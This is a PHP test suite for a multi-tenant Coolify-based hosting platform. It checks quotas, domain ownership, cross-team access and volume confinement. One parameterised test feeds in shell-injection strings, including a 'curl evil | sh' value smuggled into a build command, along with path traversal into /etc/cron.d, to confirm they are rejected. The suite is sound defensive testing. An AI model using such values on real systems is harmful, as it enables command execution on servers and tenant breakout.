<?php

use App\Exceptions\PlatformPolicyViolation;
use App\Models\Application;
use App\Models\Environment;
use App\Models\InstanceSettings;
use App\Models\LocalFileVolume;
use App\Models\LocalPersistentVolume;
use App\Models\PlatformAllocation;
use App\Models\PlatformRegion;
use App\Models\PlatformTenant;
use App\Models\Project;
use App\Models\Server;
use App\Models\StandaloneDocker;
use App\Models\StandalonePostgresql;
use App\Models\Team;
use App\Services\Platform\DomainPolicy;
use App\Services\Platform\PlatformGate;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Queue;
use Illuminate\Validation\ValidationException;
use Visus\Cuid2\Cuid2;

uses(RefreshDatabase::class);

/**
 * @return array{node: Server, region: PlatformRegion}
 */
function tenancyPlatform(): array
{
    config([
        'constants.coolify.self_hosted' => false,
        'platform.enabled' => true,
        'platform.base_domain' => 'apps.example.com',
        'platform.reserved_hosts' => ['www', 'grafana'],
    ]);
    InstanceSettings::query()->firstOrCreate(['id' => 0], ['fqdn' => 'https://cloud.example.com']);
    if (! Team::query()->whereKey(0)->exists()) {
        Team::forceCreate(['id' => 0, 'name' => 'Root Team', 'personal_team' => false]);
    }
    $region = PlatformRegion::create(['slug' => 'sa-east-1', 'name' => 'São Paulo', 'is_default' => true]);
    $node = Server::forceCreate([
        'uuid' => (string) new Cuid2,
        'name' => 'node-'.fake()->unique()->numberBetween(1, 9999),
        'ip' => fake()->unique()->ipv4(),
        'team_id' => 0,
        'private_key_id' => 1,
        'platform_region_id' => $region->id,
    ]);

    return ['node' => $node, 'region' => $region];
}

/**
 * @return array{team: Team, tenant: PlatformTenant, destination: StandaloneDocker, environment: Environment}
 */
function tenancyTenant(Server $node, string $plan = 'pro', string $status = PlatformTenant::STATUS_ACTIVE): array
{
    $team = Team::factory()->create();
    $tenant = PlatformTenant::forTeam($team);
    $tenant->update(['plan' => $plan, 'status' => $status]);
    $destination = StandaloneDocker::withoutEvents(fn () => StandaloneDocker::forceCreate([
        'uuid' => (string) new Cuid2,
        'name' => "tenant-{$team->id}",
        'network' => "tenant-{$team->id}",
        'server_id' => $node->id,
        'team_id' => $team->id,
    ]));
    $project = Project::forceCreate(['uuid' => (string) new Cuid2, 'name' => 'Project '.$team->id, 'team_id' => $team->id]);

    return ['team' => $team, 'tenant' => $tenant->fresh(), 'destination' => $destination, 'environment' => $project->environments()->first()];
}

function tenancyApplication(array $world, array $attributes = []): Application
{
    return Application::create(array_merge([
        'name' => 'app-'.fake()->unique()->numberBetween(1, 99999),
        'git_repository' => 'https://github.com/coollabsio/coolify-examples',
        'git_branch' => 'main',
        'build_pack' => 'nixpacks',
        'ports_exposes' => '3000',
        'environment_id' => $world['environment']->id,
        'destination_id' => $world['destination']->id,
        'destination_type' => StandaloneDocker::class,
    ], $attributes));
}

it('detects platform mode and tenants', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node']);

    expect(isPlatform())->toBeTrue()
        ->and(isPlatformTenant($world['team']))->toBeTrue()
        ->and(isPlatformTenant(0))->toBeFalse()
        ->and(platformTeamOf(tenancyApplication($world))->id)->toBe($world['team']->id);

    config(['platform.enabled' => false]);
    expect(isPlatform())->toBeFalse()->and(isPlatformTenant($world['team']))->toBeFalse();
});

it('blocks resource creation for tenants without an active plan', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node'], 'pro', PlatformTenant::STATUS_PENDING);

    expect(fn () => tenancyApplication($world))->toThrow(PlatformPolicyViolation::class, 'no active plan');
});

it('enforces the number of resources of the plan', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node'], 'basic');
    config(['platform.plans.basic.quotas.resources' => 2]);

    tenancyApplication($world);
    tenancyApplication($world);

    expect(fn () => tenancyApplication($world))->toThrow(PlatformPolicyViolation::class, 'allows 2 resources');
});

it('refuses destinations of other teams (destination IDOR)', function () {
    $platform = tenancyPlatform();
    $victim = tenancyTenant($platform['node']);
    $attacker = tenancyTenant($platform['node']);
    $coolifyNetwork = StandaloneDocker::query()->where('server_id', $platform['node']->id)->whereNull('team_id')->first();

    expect(fn () => tenancyApplication($attacker, ['destination_id' => $victim['destination']->id]))
        ->toThrow(PlatformPolicyViolation::class, 'does not belong to your team');
    expect(fn () => tenancyApplication($attacker, ['destination_id' => $coolifyNetwork->id]))
        ->toThrow(PlatformPolicyViolation::class, 'does not belong to your team');
    expect(tenancyApplication($attacker)->destination_id)->toBe($attacker['destination']->id);
});

it('rejects shell metacharacters in values that reach the node shell', function (array $attributes) {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node']);

    expect(fn () => tenancyApplication($world, $attributes))->toThrow(ValidationException::class);
})->with([
    'build command quote' => [['build_command' => "npm run build' ; curl evil | sh ; echo '"]],
    'build command backtick' => [['build_command' => 'npm run `id`']],
    'dockerfile location' => [['dockerfile_location' => '/Dockerfile; id']],
    'base directory traversal' => [['base_directory' => '/../../etc']],
    'git branch' => [['git_branch' => 'main;id']],
    'commit' => [['git_commit_sha' => 'HEAD; id']],
    'host ports' => [['ports_mappings' => '80:80']],
    'privileged run option' => [['custom_docker_run_options' => '--privileged']],
    'custom compose command' => [['docker_compose_custom_start_command' => 'docker compose up; id']],
    'image' => [['docker_registry_image_name' => 'nginx" && id']],
]);

it('accepts normal build commands with double quotes and variables', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node']);

    $application = tenancyApplication($world, ['build_command' => 'npm run build && echo "done $NODE_ENV"']);

    expect($application->exists)->toBeTrue();
});

it('confines file mounts and volumes to the resource directory', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node']);
    $application = tenancyApplication($world);

    expect(fn () => LocalFileVolume::create([
        'fs_path' => application_configuration_dir()."/{$application->uuid}/../../../etc/cron.d/x",
        'mount_path' => '/x',
        'content' => 'x',
        'is_directory' => false,
        'resource_id' => $application->id,
        'resource_type' => Application::class,
    ]))->toThrow(ValidationException::class);

    expect(fn () => LocalPersistentVolume::create([
        'name' => $application->uuid.'-data',
        'mount_path' => '/data',
        'host_path' => '/',
        'resource_id' => $application->id,
        'resource_type' => Application::class,
    ]))->toThrow(ValidationException::class);

    expect(fn () => LocalPersistentVolume::create([
        'name' => 'postgres-data-victimuuid',
        'mount_path' => '/data',
        'resource_id' => $application->id,
        'resource_type' => Application::class,
    ]))->toThrow(ValidationException::class);

    $volume = LocalPersistentVolume::create([
        'name' => $application->uuid.'-data',
        'mount_path' => '/data',
        'resource_id' => $application->id,
        'resource_type' => Application::class,
    ]);
    expect($volume->exists)->toBeTrue();
});

it('gives persistent volumes and directories to every plan', function () {
    Queue::fake();
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node'], 'basic');
    $application = tenancyApplication($world);

    $volume = LocalPersistentVolume::create([
        'name' => $application->uuid.'-data',
        'mount_path' => '/data',
        'resource_id' => $application->id,
        'resource_type' => Application::class,
    ]);
    $directory = LocalFileVolume::create([
        'fs_path' => base_configuration_dir()."/applications/{$application->uuid}/uploads",
        'mount_path' => '/app/uploads',
        'is_directory' => true,
        'resource_id' => $application->id,
        'resource_type' => Application::class,
    ]);

    expect($volume->exists)->toBeTrue()->and($directory->exists)->toBeTrue();
});

it('keeps domains exclusive between tenants and protects platform hosts', function () {
    $platform = tenancyPlatform();
    $victim = tenancyTenant($platform['node']);
    $attacker = tenancyTenant($platform['node']);
    tenancyApplication($victim, ['fqdn' => 'https://shop.example.com']);

    expect(DomainPolicy::ownerOf('shop.example.com'))->toBe($victim['team']->id);
    expect(fn () => tenancyApplication($attacker, ['fqdn' => 'http://shop.example.com:8080/admin']))
        ->toThrow(PlatformPolicyViolation::class, 'already used by another account');
    expect(fn () => tenancyApplication($attacker, ['fqdn' => 'https://cloud.example.com']))
        ->toThrow(PlatformPolicyViolation::class, 'reserved');
    expect(fn () => tenancyApplication($attacker, ['fqdn' => 'https://grafana.apps.example.com']))
        ->toThrow(PlatformPolicyViolation::class, 'reserved');

    $own = tenancyApplication($victim, ['fqdn' => 'https://shop.example.com/api']);
    expect($own->exists)->toBeTrue();
});

it('limits custom domains per plan', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node'], 'basic');
    config(['platform.plans.basic.quotas.custom_domains' => 1, 'platform.plans.basic.quotas.resources' => 10]);

    tenancyApplication($world, ['fqdn' => 'https://one.com']);
    tenancyApplication($world, ['fqdn' => 'https://x1.apps.example.com']);

    expect(fn () => tenancyApplication($world, ['fqdn' => 'https://two.com']))->toThrow(PlatformPolicyViolation::class, 'custom domains');
});

it('lets the containers of a node share the plan and refuses resources spread beyond it', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node'], 'basic');
    config(['platform.plans.basic.quotas.cpus' => 1.0, 'platform.plans.basic.quotas.memory_mb' => 1024]);
    $first = tenancyApplication($world);
    $second = tenancyApplication($world);
    $elsewhere = tenancyApplication($world);
    $otherNode = Server::forceCreate([
        'uuid' => (string) new Cuid2, 'name' => 'node-b', 'ip' => fake()->unique()->ipv4(), 'team_id' => 0,
        'private_key_id' => 1, 'platform_region_id' => $platform['region']->id,
    ]);

    $compose = ['services' => ['web' => ['image' => 'nginx', 'mem_limit' => '768m', 'cpus' => 0.5]]];
    $hardened = PlatformGate::harden($first, $compose, $platform['node']->id);

    expect($hardened['services']['web']['mem_limit'])->toBe('768m')
        ->and(PlatformAllocation::query()->where('team_id', $world['team']->id)->count())->toBe(1)
        ->and(PlatformGate::allocated($world['team']))->toBe(['cpus' => 0.5, 'memory_mb' => 768, 'containers' => 1]);

    // Same node: both run in the tenant slice, which never gives them more than the plan.
    PlatformGate::harden($second, $compose, $platform['node']->id);
    expect(PlatformGate::allocated($world['team']))->toBe(['cpus' => 1.0, 'memory_mb' => 1024, 'containers' => 2]);

    // Another node has its own slice: the plan would count twice.
    expect(fn () => PlatformGate::harden($elsewhere, $compose, $otherNode->id))
        ->toThrow(PlatformPolicyViolation::class, 'Memory quota exceeded (1792 of 1024 MB on 2 servers');

    PlatformGate::harden($first, $compose, $platform['node']->id);
    expect(PlatformAllocation::query()->where('team_id', $world['team']->id)->count())->toBe(2);

    PlatformGate::release($first);
    PlatformGate::release($second);
    expect(PlatformGate::harden($elsewhere, $compose, $otherNode->id)['services']['web']['cpus'])->toBe(0.5);

    // When the containers do not share the plan, every container limit counts in full.
    PlatformGate::release($elsewhere);
    config(['platform.container.shared_plan' => false]);
    PlatformGate::harden($first, $compose, $otherNode->id);
    expect(fn () => PlatformGate::harden($second, $compose, $otherNode->id))->toThrow(PlatformPolicyViolation::class, 'Memory quota exceeded (1536 of 1024 MB)');
});

it('blocks deployments of suspended tenants', function () {
    $platform = tenancyPlatform();
    $world = tenancyTenant($platform['node']);
    $application = tenancyApplication($world);
    $world['tenant']->update(['status' => PlatformTenant::STATUS_SUSPENDED]);

    expect(fn () => PlatformGate::assertCanDeploy($application))->toThrow(PlatformPolicyViolation::class, 'overdue');
});

it('does not apply platform rules to the operator team', function () {
    $platform = tenancyPlatform();
    $project = Project::forceCreate(['uuid' => (string) new Cuid2, 'name' => 'Ops', 'team_id' => 0]);
    $destination = StandaloneDocker::query()->where('server_id', $platform['node']->id)->whereNull('team_id')->first();

    $database = StandalonePostgresql::create([
        'uuid' => (string) new Cuid2,
        'name' => 'ops-db',
        'postgres_password' => 'x',
        'environment_id' => $project->environments()->first()->id,
        'destination_id' => $destination->id,
        'destination_type' => StandaloneDocker::class,
    ]);

    expect($database->exists)->toBeTrue()
        ->and(PlatformGate::applies($database))->toBeFalse();
});
